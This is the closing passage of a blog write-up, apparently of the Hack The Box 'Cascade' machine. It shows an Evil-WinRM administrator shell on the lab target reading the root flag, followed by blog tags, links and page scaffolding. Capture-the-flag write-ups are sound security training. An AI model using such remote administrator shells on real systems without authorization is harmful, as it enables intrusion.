Evil-WinRM shell v2.3                                                                                                                
                                                                                                                                     
Info: Establishing connection to remote endpoint                                                                                     
                                                                                                                                         
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/root.txt
f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/dotnet/" class="post-tag no-text-decoration" >dotnet</a> <a href="/tags/sqlite/" class="post-tag no-text-decoration" >sqlite</a> <a href="/tags/winrm/" class="post-tag no-text-decoration" >winrm</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Cascade - rizemon's blog&url=https://rizemon.github.io/posts/cascade-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Cascade - rizemon's blog&u=https://rizemon.github.io/posts/cascade-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Cascade - rizemon's blog&url=https://rizemon.github.io/posts/cascade-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/sniper-htb/"><div class="card-body"> <span class="timeago small" > Mar 29, 2020 <i class="unloaded">2020-03-29T15:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Sniper</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sauna-htb/" class="btn btn-outline-primary"><p>Hack The Box - Sauna</p></a> <a href="/posts/traceback-htb/" class="btn btn-outline-primary"><p>Hack The Box - Traceback</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
